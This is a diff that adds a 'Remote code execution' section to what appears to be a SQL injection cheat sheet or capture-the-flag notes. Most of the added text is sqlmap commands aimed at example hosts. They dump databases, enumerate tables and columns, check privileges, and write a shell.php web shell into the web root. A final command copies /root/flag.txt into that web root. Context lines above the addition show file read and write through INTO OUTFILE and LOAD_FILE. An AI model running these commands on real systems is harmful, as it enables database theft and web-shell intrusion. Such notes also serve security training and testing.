@@ -726,4 +726,37 @@ SELECT * FROM users INTO OUTFILE '/var/lib/mysql-files/test.txt'
 SELECT LOAD_FILE('/var/lib/mysql-files/test.txt')
 ```
 
+### Remote code execution
+
+Here’s an example command to perform Error-based SQL Injection using SQLmap:
+
+```shell
+sqlmap -u "http://example.com/vulnerable.php?id=1" --technique E --dump
+```
+
+This command specifies the target URL and injection point using the -u option, the Error-based SQL Injection technique using the --technique option, and the --dump option to extract data from the database.
+
+```shell
+sqlmap -u "http://example/index.php?id=8" --tables --batch
+```
+
+```shell
+sqlmap -u "http://example/index.php?id=8" -D extramile -T flags --columns --batch
+```
+
+```shell
+sqlmap -u "http://example/page.php?id=8" --privileges --current-user
+```
+
+```shell
+sqlmap -u "http://target.com/page.php?id=1" \
+--file-write="shell.php" \
+--file-dest="/var/www/html/shell.php" \
+--batch
+```
+
+```shell
+cp /root/flag.txt /var/www/html/
+```
+
 
